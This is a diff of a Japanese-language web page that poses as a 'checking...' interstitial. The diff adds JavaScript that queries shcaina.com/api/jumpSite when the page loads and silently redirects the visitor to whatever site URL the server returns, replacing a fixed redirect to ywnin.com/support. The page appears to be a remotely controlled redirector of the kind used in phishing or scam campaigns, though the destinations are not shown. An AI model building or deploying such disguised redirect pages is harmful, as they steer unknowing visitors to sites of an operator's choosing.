@@ -1,45 +1,44 @@
-
-<html><head>
+﻿<html><head>
  
 
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta http-equiv="Content-Language" content="ja">
 <title>確認中。。。。</title>
-<!--<meta http-equiv="Content-Script-Type" content="text/javascript">-->
+<meta http-equiv="Content-Script-Type" content="text/javascript">
 
-<!--  <style type="text/css">-->
-<!--        .focus-->
-<!--        {-->
-<!--            border: 1px solid #f00;-->
-<!--            background: #fcc;-->
-<!--        }-->
+  <style type="text/css">
+        .focus
+        {
+            border: 1px solid #f00;
+            background: #fcc;
+        }
 
 
 
 
           
-<!--     .a-loading-overlay{-->
-<!--          position: fixed;-->
-<!--    z-index: 10000;-->
-<!--    width: 220px;-->
-<!--    height: 150px;-->
-<!--    left: 50%;-->
-<!--    top: 50%;-->
-<!--    margin-top: -75px;-->
-<!--    margin-left: -110px;-->
-<!--    background: #121111c9;-->
-<!--    border-radius: 10px;-->
-<!--      }-->
-<!--      .a-loading_spinner{-->
-<!--          margin-top: -10px;-->
-<!--      }-->
+     .a-loading-overlay{
+          position: fixed;
+    z-index: 10000;
+    width: 220px;
+    height: 150px;
+    left: 50%;
+    top: 50%;
+    margin-top: -75px;
+    margin-left: -110px;
+    background: #121111c9;
+    border-radius: 10px;
+      }
+      .a-loading_spinner{
+          margin-top: -10px;
+      }
       
-<!--      .a-loading_spinner:after {-->
+      .a-loading_spinner:after {
  
-<!--           border-right-color: #2c292900; -->
-<!--          }-->
-<!--</style>-->
-<!--<body>-->
+           border-right-color: #2c292900; 
+          }
+</style>
+<body>
 <!--<div>-->
 <!--	<div id="s-loading" class="a-loading a-loading-overlay" >-->
 <!--	  <div class="a-loading_spinner" style="text-align: center;"><img src="./loading.gif"  style="text-align: center;height: 50px;position: relative;margin-top: 50px;"/></div>-->
@@ -62,11 +61,38 @@
 <script type="text/javascript" charset="utf-8">
     
 
+function getRandomArrayValue(arr) {
+    if (arr.length === 0) return undefined; // 如果数组为空，返回undefined
+    const randomIndex = Math.floor(Math.random() * arr.length); // 生成随机索引
+    return arr[randomIndex]; // 返回随机索引处的值
+}
+ 
+// 示例使用
+const myArray = ['tt'];
+const randomValue = getRandomArrayValue(myArray);
 
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://shcaina.com/api/jumpSite?siteName='+randomValue, true);
+ 
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    if (xhr.status === 200) {
+      // 请求成功
+      var data = JSON.parse(xhr.responseText);
+        window.location.href=data.data.siteUrl;
+      
+    } else {
+      // 请求失败
+      console.error('请求出错:', xhr.statusText);
+    }
+  }
+};
+ 
+xhr.send();
 
-// let countdown = 60;
-// let interval;
-// const countdownEl = document.getElementById('countdown');
+let countdown = 60;
+let interval;
+const countdownEl = document.getElementById('countdown');
 
 // function start() {
 //     interval = setInterval(() => {
@@ -79,6 +105,6 @@
 //     }, 1000);
 // }
 // start()
-window.location.href="https://ywnin.com/support";
+
 </script>
 </body></html>
